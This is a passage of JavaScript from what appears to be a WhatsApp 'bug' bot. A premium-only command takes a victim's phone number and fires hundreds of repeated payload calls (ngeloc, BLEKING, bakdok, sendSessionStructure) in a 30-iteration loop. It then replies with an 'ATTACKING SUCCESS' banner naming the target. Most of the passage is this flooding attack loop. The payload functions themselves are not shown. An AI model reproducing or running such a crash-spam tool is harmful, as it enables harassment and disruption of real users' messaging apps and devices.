await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 3.0,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────「 𝐁𝐮𝐠 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 𝐆𝐚𝐜𝐨𝐫🤩」──`)
break

case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-forger':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await sendSessionStructure(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
